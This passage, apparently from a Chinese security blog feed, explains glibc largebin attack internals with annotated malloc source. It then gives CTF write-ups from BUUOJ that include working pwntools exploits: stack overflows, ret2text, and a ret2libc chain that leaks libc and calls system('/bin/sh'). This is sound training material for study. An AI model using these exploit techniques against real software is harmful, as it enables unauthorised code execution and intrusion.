class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-comment">/* place chunk in bin */</span><br><br>          <span class="hljs-keyword">if</span> (in_smallbin_range (size))<br>            &#123;<br>              victim_index = smallbin_index (size);<br>              bck = bin_at (av, victim_index);<br>              fwd = bck-&gt;fd;<br>            &#125;<br>          <span class="hljs-keyword">else</span><br>            &#123;<span class="hljs-comment">//所需chunk不属于small bins，则一定属于large bins</span><br>             <span class="hljs-comment">//根据chunk的大小获得对应large bin的index</span><br>              victim_index = largebin_index (size);<br>              bck = bin_at (av, victim_index);<span class="hljs-comment">//bck为large bin的链表头</span><br>              fwd = bck-&gt;fd;<span class="hljs-comment">//链表首元结点</span><br><br>              <span class="hljs-comment">/* maintain large bins in sorted order */</span><br>              <span class="hljs-keyword">if</span> (fwd != bck)<br>                &#123;<span class="hljs-comment">//如果fwd不等于bck，则意味着large bin中有空闲chunk存在</span><br>                  <span class="hljs-comment">/* Or with inuse bit to speed comparisons */</span><br>                  size |= PREV_INUSE;<br>                  <span class="hljs-comment">/* if smaller than smallest, bypass loop below */</span><br>                  assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == <span class="hljs-number">0</span>);<span class="hljs-comment">//是否在主线程</span><br>                  <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (size) &lt; (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (bck-&gt;bk-&gt;size))<br>                    &#123;<span class="hljs-comment">//如果所需chunk比large bin的最后一个chunk大小还小，那么当前chunk就插入到large bin的链表的最后</span><br>                      fwd = bck; <span class="hljs-comment">//此时fwd为链表表头</span><br>                      bck = bck-&gt;bk; <span class="hljs-comment">//bck置为链表的最后一个chunk</span><br><br>                      victim-&gt;fd_nextsize = fwd-&gt;fd;<span class="hljs-comment">//victim要插入到链表最后，那么比它小的就是链表的首元结点</span><br>                      victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;<span class="hljs-comment">//比它大的就是最小的那一个（双向链表的插入操作）</span><br>                      fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<span class="hljs-comment">//完成插入操作，画个图就懂了</span><br>                    &#125;<br>                  <span class="hljs-keyword">else</span><br>                    &#123;<span class="hljs-comment">//正向遍历链表，直到找到第一个chunk大小小于等于当前chunk大小的chunk退出循环</span><br>                      assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="hljs-number">0</span>);<br>                      <span class="hljs-keyword">while</span> ((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) size &lt; fwd-&gt;size)<br>                        &#123;<br>                          fwd = fwd-&gt;fd_nextsize;<br>                          assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="hljs-number">0</span>);<br>                        &#125;<br><br>                      <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) size == (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) fwd-&gt;size)<br>                        <span class="hljs-comment">/* Always insert in the second position.  */</span><br>                        <span class="hljs-comment">//如果找到了大小相同的chunk</span><br>                        fwd = fwd-&gt;fd;<br>                      <span class="hljs-keyword">else</span><br>                        &#123;<span class="hljs-comment">//双向链表插入</span><br>                          victim-&gt;fd_nextsize = fwd;<br>                          victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;<br>                          fwd-&gt;bk_nextsize = victim;<br>                          victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br>                        &#125;<br>                      bck = fwd-&gt;bk;<br>                    &#125;<br>                &#125;<br>              <span class="hljs-keyword">else</span><br>                victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;<span class="hljs-comment">//唯一的chunk，也做成循环链表</span><br>            &#125;<br><br>          mark_bin (av, victim_index);<br>          victim-&gt;bk = bck;<br>          victim-&gt;fd = fwd;<br>          fwd-&gt;bk = victim;<br>          bck-&gt;fd = victim;<br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MAX_ITERS       10000</span><br>          <span class="hljs-keyword">if</span> (++iters &gt;= MAX_ITERS)<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br></code></pre></div></td></tr></table></figure><h1 id="how2heap源码调试"><a href="#how2heap源码调试" class="headerlink" title="how2heap源码调试"></a>how2heap源码调试</h1><p>先申请三个堆块和fastbin，防止free的时候与top chunk合并</p><p><img src="https://i.loli.net/2021/03/28/XPT4i62LBxmqjad.png"></p><p>接着释放p1和p2</p><p><img src="https://i.loli.net/2021/03/28/G1sFljKpOLEgXJW.png"></p><p>然后会申请一个0x90大小的chunk，根据上文源码分析可知，此时会将unsorted bin里的p1放入small bin，将p2放入large bin，由于我们申请的大小为0x90，会到small bin里找，将p1进行切割以满足0x90的要求，并剩余的大小（0x330-0xa0）放入unsorted bin里</p><p><img src="https://i.loli.net/2021/03/28/AD3xhykYF9Bwn1p.png"><br><img src="https://i.loli.net/2021/03/28/RXhSLcxeN39rf7D.png"></p><p>接下来修改p2:</p><table><thead><tr><th align="center">previous chunk size</th><th align="center">size=0x3f1</th></tr></thead><tbody><tr><td align="center"><strong>fd=0</strong></td><td align="center"><strong>bk=addr1</strong></td></tr><tr><td align="center"><strong>fd_nextsize=0</strong></td><td align="center"><strong>bk_nextsize=addr2</strong></td></tr></tbody></table><p>修改后：</p><p><img src="https://i.loli.net/2021/03/28/wzx1nrUfmpOvLW6.png"></p><p>此时再申请0x90的chunk，将size=0x291的chunk放入small bin，将size=0x411的chunk放入large bin<br>由于之前p2的大小被修改为0x3f1&lt;0x411，所以会执行下面的操作：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-keyword">else</span><br>    &#123;<span class="hljs-comment">//双向链表插入</span><br>        victim-&gt;fd_nextsize = fwd;<br>        victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;<br>        fwd-&gt;bk_nextsize = victim;<br>        victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br>    &#125;<br>bck = fwd-&gt;bk;                 &#125;<br></code></pre></div></td></tr></table></figure><p>即</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C">victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;<br>victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br><span class="hljs-comment">//--&gt;</span><br>addr2-&gt;fd_nextsize = victim;<br>*(addr2+<span class="hljs-number">4</span>) = victim;<br></code></pre></div></td></tr></table></figure><p>还有另一个利用：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C">mark_bin (av, victim_index);<br>victim-&gt;bk = bck;<br>victim-&gt;fd = fwd;<br>fwd-&gt;bk = victim;<br>bck-&gt;fd = victim;<br></code></pre></div></td></tr></table></figure><p>即</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C">victim-&gt;bk = addr1 = bck<br>bck-&gt;fd = victim<br>addr1-&gt;fd = victim<br><span class="hljs-comment">//--&gt;</span><br>*(addr1+<span class="hljs-number">2</span>) = victim<br></code></pre></div></td></tr></table></figure><h1 id="例题练习"><a href="#例题练习" class="headerlink" title="例题练习"></a>例题练习</h1><p>有空再做</p><h1 id="largebin-attack的利用方法"><a href="#largebin-attack的利用方法" class="headerlink" title="largebin attack的利用方法"></a>largebin attack的利用方法</h1><ul><li>可以修改一个 large bin chunk 的 data</li><li>从 unsorted bin 中来的 large bin chunk 要紧跟在被构造过的 chunk 的后面</li></ul>]]></content>
    
    
    <categories>
      
      <category>二进制漏洞</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>how2heap</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUUOJ刷题记录补档-1</title>
    <link href="/2021/03/22/BUUOJ%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95%E8%A1%A5%E6%A1%A31/"/>
    <url>/2021/03/22/BUUOJ%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95%E8%A1%A5%E6%A1%A31/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>上学期和寒假刷了一些题，但是因为懒没有全部记录下，现在分几篇博客慢慢补上，也当作回顾<br>这篇的题应该都是很基础的，不详细写（偷懒）</p><h2 id="0x1-warmup-csaw-2016"><a href="#0x1-warmup-csaw-2016" class="headerlink" title="0x1 warmup_csaw_2016"></a>0x1 warmup_csaw_2016</h2><p>常规栈溢出</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>p = remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-string">&#x27;27790&#x27;</span>)<br>binsh_addr = <span class="hljs-number">0x40060d</span><br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">0x40</span>+<span class="hljs-number">8</span>) + p64(binsh_addr)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></div></td></tr></table></figure><h2 id="0x2-pwn1-sctf-2016"><a href="#0x2-pwn1-sctf-2016" class="headerlink" title="0x2 pwn1_sctf_2016"></a>0x2 pwn1_sctf_2016</h2><p>ret2text</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>p = remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-string">&#x27;29973&#x27;</span>)<br>binsh_addr = <span class="hljs-number">0x08048F0D</span><br>payload = <span class="hljs-string">&#x27;I&#x27;</span>*<span class="hljs-number">20</span> + <span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">4</span> + p32(binsh_addr)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></div></td></tr></table></figure><h2 id="0x3-ciscn-2019-n-1"><a href="#0x3-ciscn-2019-n-1" class="headerlink" title="0x3 ciscn_2019_n_1"></a>0x3 ciscn_2019_n_1</h2><p>溢出到v2，把v2改成11.28125，这里要用11.28125在内存中的地址</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>p = remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-string">&#x27;27563&#x27;</span>)<br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">0x30</span>-<span class="hljs-number">0x5</span>+<span class="hljs-number">1</span>) + p64(<span class="hljs-number">0x41348000</span>)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></div></td></tr></table></figure><h2 id="0x4-jarvisoj-level0"><a href="#0x4-jarvisoj-level0" class="headerlink" title="0x4 jarvisoj_level0"></a>0x4 jarvisoj_level0</h2><p>ret2text</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>sh = remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-string">&#x27;26488&#x27;</span>)<br>binsh = <span class="hljs-number">0x0400596</span><br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">0x80</span>+<span class="hljs-number">8</span>) + p64(binsh)<br>sh.sendline(payload)<br>sh.interactive()<br></code></pre></div></td></tr></table></figure><h2 id="0x5-ciscn-2019-c-1"><a href="#0x5-ciscn-2019-c-1" class="headerlink" title="0x5 ciscn_2019_c_1"></a>0x5 ciscn_2019_c_1</h2><p>ret2libc，当时做这种题可把我坑苦了，后来深入理解函数栈的调用和64位系统通过寄存器传参后就好了<br>重点还是从汇编角度来理解，做题的时候已经变成一种模板了</p><h3 id="主函数"><a href="#主函数" class="headerlink" title="主函数"></a>主函数</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">int</span> v4; <span class="hljs-comment">// [rsp+Ch] [rbp-4h]</span><br><br>  init(*(_QWORD *)&amp;argc, argv, envp);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;EEEEEEE                            hh      iii                &quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;EE      mm mm mmmm    aa aa   cccc hh          nn nnn    eee  &quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;EEEEE   mmm  mm  mm  aa aaa cc     hhhhhh  iii nnn  nn ee   e &quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;EE      mmm  mm  mm aa  aaa cc     hh   hh iii nn   nn eeeee  &quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;EEEEEEE mmm  mm  mm  aaa aa  ccccc hh   hh iii nn   nn  eeeee &quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;====================================================================&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Welcome to this Encryption machine\n&quot;</span>);<br>  begin();<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  &#123;<br>    <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>    &#123;<br>      fflush(<span class="hljs-number">0LL</span>);<br>      v4 = <span class="hljs-number">0</span>;<br>      __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;v4);<br>      getchar();<br>      <span class="hljs-keyword">if</span> ( v4 != <span class="hljs-number">2</span> )<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;I think you can do it by yourself&quot;</span>);<br>      begin();<br>    &#125;<br>    <span class="hljs-keyword">if</span> ( v4 == <span class="hljs-number">3</span> )<br>    &#123;<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Bye!&quot;</span>);<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> ( v4 != <span class="hljs-number">1</span> )<br>      <span class="hljs-keyword">break</span>;<br>    encrypt();<br>    begin();<br>  &#125;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Something Wrong!&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;   <br></code></pre></div></td></tr></table></figure><p>重点在encrypt处：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">encrypt</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">size_t</span> v0; <span class="hljs-comment">// rbx</span><br>  <span class="hljs-keyword">char</span> s[<span class="hljs-number">48</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-50h]</span><br>  __int16 v3; <span class="hljs-comment">// [rsp+30h] [rbp-20h]</span><br><br>  <span class="hljs-built_in">memset</span>(s, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(s));<br>  v3 = <span class="hljs-number">0</span>;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Input your Plaintext to be encrypted&quot;</span>);<br>  gets(s);<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  &#123;<br>    v0 = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)x;<br>    <span class="hljs-keyword">if</span> ( v0 &gt;= <span class="hljs-built_in">strlen</span>(s) )<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">if</span> ( s[x] &lt;= <span class="hljs-number">96</span> || s[x] &gt; <span class="hljs-number">122</span> )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( s[x] &lt;= <span class="hljs-number">64</span> || s[x] &gt; <span class="hljs-number">90</span> )<br>      &#123;<br>        <span class="hljs-keyword">if</span> ( s[x] &gt; <span class="hljs-number">47</span> &amp;&amp; s[x] &lt;= <span class="hljs-number">57</span> )<br>          s[x] ^= <span class="hljs-number">0xF</span>u;<br>      &#125;<br>      <span class="hljs-keyword">else</span><br>      &#123;<br>        s[x] ^= <span class="hljs-number">0xE</span>u;<br>      &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      s[x] ^= <span class="hljs-number">0xD</span>u;<br>    &#125;<br>    ++x;<br>  &#125;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Ciphertext&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(s);<br>&#125;<br></code></pre></div></td></tr></table></figure><p>存在栈溢出，这里会根据输入字符串长度对字符串进行加密，只是简单的异或，可以自己写一个异或加密函数把payload加密一下。<br>这里更方便的是利用strlen函数的特点：<strong>C 库函数 size_t strlen(const char *str) 计算字符串 str 的长度，直到空结束字符，但不包括空结束字符。**，在payload开始处填充’\x00’使strlen函数返回值为</strong>0**，从而绕过加密<br>ret2libc题目，没有system和’/bin/sh’,而且PIE是关闭的，我们可以泄露puts函数的got表项，再根据其与libc中的偏移计算得到system和/bin/sh的地址。<br>由于是64位程序，需要向rdi寄存器传入函数参数，用ROP_gadget找一些gadget:</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs Bash">$ ROPgadget --binary ciscn_2019_c_1 --only <span class="hljs-string">&#x27;pop|ret&#x27;</span> | grep rdi<br>0x0000000000400c83 : pop rdi ; ret<br></code></pre></div></td></tr></table></figure><p>一些解释和汇编角度来理解payload执行的思路放在exp里面吧，不得不说学汇编真的是重要<br>贴一下ret指令的作用：</p><ul><li>sp增加一个内存单元</li><li>栈顶数据出栈赋值给ip寄存器</li></ul><p>还有使用ret的原因：<a href="http://blog.eonew.cn/archives/958">在一些64位的glibc的payload调用system函数失败问题</a><br>exp:</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span>*<br><br>sh = remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-string">&#x27;29858&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./ciscn_2019_c_1&#x27;</span>)<br><br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>rdi_addr = <span class="hljs-number">0x0000000000400c83</span><br>main = elf.symbols[<span class="hljs-string">&#x27;main&#x27;</span>]<br>ret = <span class="hljs-number">0x00000000004006b9</span><br><br>sh.sendlineafter(<span class="hljs-string">&#x27;choice!\n&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br><span class="hljs-comment"># 这里函数ret的时候会把栈提高一个内存单元，也就是ebp+0x8，然后pop，rdi_addr进入eip寄存器后，esp+0x8，也就是到了</span><br><span class="hljs-comment"># puts_got的位置，然后eip执行指令就可以把参数传入rdi了，pop rdi完了esp再抬0x8到puts_plt的位置，执行ret,相当于调用puts_plt，</span><br><span class="hljs-comment"># 就可以打印出got表项了</span><br>payload = <span class="hljs-string">&#x27;\0&#x27;</span> + <span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">0x50</span>+<span class="hljs-number">8</span>-<span class="hljs-number">1</span>) + p64(rdi_addr) + p64(puts_got) + p64(puts_plt) + p64(main)<br>sh.sendlineafter(<span class="hljs-string">&#x27;encrypted\n&#x27;</span>,payload)<br><br><span class="hljs-comment"># 要接收两次，第一次把 **puts(&quot;Ciphertext&quot;);**里的接收掉</span><br>sh.recvline()<br>sh.recvline()<br><br>puts_addr = u64(sh.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>)[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>))<br>libc = LibcSearcher(<span class="hljs-string">&#x27;puts&#x27;</span>,puts_addr)<br>libcbase = puts_addr - libc.dump(<span class="hljs-string">&#x27;puts&#x27;</span>)<br>system_addr = libcbase + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>binsh_addr = libcbase + libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br><br><span class="hljs-comment"># 这里要用ret对齐</span><br>sh.sendlineafter(<span class="hljs-string">&#x27;choice!\n&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>payload = <span class="hljs-string">&#x27;\0&#x27;</span> + <span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">0x50</span>+<span class="hljs-number">8</span>-<span class="hljs-number">1</span>) + p64(ret)+p64(rdi_addr) + p64(binsh_addr) + p64(system_addr) + p64(main)<br>sh.sendlineafter(<span class="hljs-string">&#x27;encrypted\n&#x27;</span>,payload)<br>sh.interactive()<br></code></pre></div></td></tr></table></figure><h2 id="0x6-OGeek2019-babyrop"><a href="#0x6-OGeek2019-babyrop" class="headerlink" title="0x6 [OGeek2019]babyrop"></a>0x6 [OGeek2019]babyrop</h2><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">int</span> buf; <span class="hljs-comment">// [esp+4h] [ebp-14h]</span><br>  <span class="hljs-keyword">char</span> v2; <span class="hljs-comment">// [esp+Bh] [ebp-Dh]</span><br>  <span class="hljs-keyword">int</span> fd; <span class="hljs-comment">// [esp+Ch] [ebp-Ch]</span><br><br>  sub_80486BB();<br>  fd = open(<span class="hljs-string">&quot;/dev/urandom&quot;</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-keyword">if</span> ( fd &gt; <span class="hljs-number">0</span> )<br>    read(fd, &amp;buf, <span class="hljs-number">4u</span>);<br>  v2 = sub_804871F(buf);<br>  sub_80487D0(v2);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>随机数可以不用管，重点在这里：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">sub_804871F</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a1)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">size_t</span> v1; <span class="hljs-comment">// eax</span><br>  <span class="hljs-keyword">char</span> s; <span class="hljs-comment">// [esp+Ch] [ebp-4Ch]</span><br>  <span class="hljs-keyword">char</span> buf[<span class="hljs-number">7</span>]; <span class="hljs-comment">// [esp+2Ch] [ebp-2Ch]</span><br>  <span class="hljs-keyword">unsigned</span> __int8 v5; <span class="hljs-comment">// [esp+33h] [ebp-25h]</span><br>  <span class="hljs-keyword">ssize_t</span> v6; <span class="hljs-comment">// [esp+4Ch] [ebp-Ch]</span><br><br>  <span class="hljs-built_in">memset</span>(&amp;s, <span class="hljs-number">0</span>, <span class="hljs-number">0x20</span>u);<br>  <span class="hljs-built_in">memset</span>(buf, <span class="hljs-number">0</span>, <span class="hljs-number">0x20</span>u);<br>  <span class="hljs-built_in">sprintf</span>(&amp;s, <span 